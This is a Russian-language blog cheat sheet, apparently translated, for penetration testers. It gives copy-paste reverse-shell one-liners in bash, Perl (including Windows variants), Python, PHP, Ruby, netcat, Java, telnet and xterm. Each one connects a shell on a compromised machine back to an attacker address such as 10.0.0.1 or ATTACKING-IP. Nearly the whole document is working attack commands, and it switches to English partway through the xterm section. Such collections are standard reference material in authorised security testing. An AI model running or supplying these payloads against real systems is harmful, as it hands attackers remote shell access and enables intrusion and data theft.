---
layout: post
categories: cheatsheets_rus
published: true
---
# Оглавление
{:.no_toc}

* toc
{:toc}

# Общие слова

Если тебе повезло обнаружить уязвимость выполнения команд во время теста на проникновение, довольно скоро тебе захочется интерактивный шелл.

Если не получается добавить новый аккаунт / SSH ключ / .rhosts файл, твой следующий шаг, вероятно, будет либо делать обратный шелл, либо привязывать оболочку к порту TCP. Эта страница поможет с первым.

Варианты делать обратный шелл ограничены языками сценариев, установленными в целевой системе, хотя также можете загрузить бинарник, если достаточно хорошо подготовиться.

Показанные примеры предназначены для Unix-подобных систем. Некоторые из приведенных ниже примеров также должны работать в Windows, если вы используете замену “/bin/sh -i” с “cmd.exe”.

Почти каждый из методов приведенных ниже предназначен для использования в качестве одной строки которую можно копировать/вставлять. Это довольно короткие строки, но не очень читаемые.

# Bash

Некоторые версии bash могут помочь с реверс шеллом (тестированно на Ubuntu 10.10):
~~~
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
~~~
~~~
exec /bin/bash 0&0 2>&0
~~~
# PERL

Вот короткая, не зависищая от фич версия  perl реверс шелла:

	perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i))))
    {open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

И для Windows

~~~
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
~~~
~~~
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))
{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
~~~

# Python

Тестированно на Linux/Python 2.7:

	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.0.0.1",1234));
    os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP

Этот код предполагает TCP соединение с дескриптором 3. Это работало на тест системе. Если не работает, попробуй 4, 5, 6…

	php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

Если хочешь .php файл для загрузки, посмотри более навороченные php.

# Ruby

	ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Netcat

Netcat редко присутствует в продакшен системах, и даже если там несколько версий netcat, некоторые из них не поддерживают опцию -e.

~~~
nc -e /bin/sh 10.0.0.1 1234
~~~

Если у вас установлена неправильная версия netcat, ты всё равно можешь получить реверс шелл вот так:

	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

# Java

	r = Runtime.getRuntime()
	p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
	p.waitFor()



# Telnet 

~~~
rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
~~~
~~~
telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
~~~

Не забудь также слушать 443 на атакующей машине.

# xterm

Одной из самых простых форм обратной оболочки является xterm. Следующая команда должна быть запущена на сервере. Он попытается подключиться к тебе (10.0.0.1) через TCP-порт 6001.


	xterm -display 10.0.0.1:1

To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):

	Xnest :1

You’ll need to authorise the target to connect to you (command also run on your host):

	xhost +targetip
